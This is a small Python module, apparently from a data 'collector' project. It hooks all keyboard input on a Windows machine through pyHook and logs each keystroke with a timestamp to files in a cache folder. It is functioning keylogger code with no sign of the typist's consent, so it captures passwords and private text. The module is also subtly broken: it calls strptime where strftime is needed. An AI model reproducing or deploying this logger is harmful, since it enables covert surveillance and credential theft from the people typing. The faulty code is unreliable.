# _*_ coding:utf-8 _*_

import os
import time
import datetime
import pyHook
import pythoncom
from collector.utils import config


def get_time_info(fmt=None):
    timestamp = int(time.time())
    dt_str = None
    if fmt:
        dt = datetime.datetime.fromtimestamp(timestamp)
        dt_str = dt.strptime(fmt)
    return timestamp, str(dt_str)


def get_cache_dir():
    name = 'keyboard'
    path = os.path.join(config.CACHE_DIR, name)
    if not os.path.exists(path):
        os.makedirs(path)
    return path


def on_keyboard_event(event):
    timestamp, dt_str = get_time_info(fmt="%Y-%m-%d-%H-%M")
    save_path = os.path.join(get_cache_dir(), dt_str)
    with open(save_path, 'a', newline='\r\n') as fd:
        message = str(timestamp) + str(event.Key)
        fd.write(message)
    return True


def run():
    hook = pyHook.HookManager()
    hook.KeyDown = on_keyboard_event
    hook.HookKeyboard()
    pythoncom.PumpMessages()
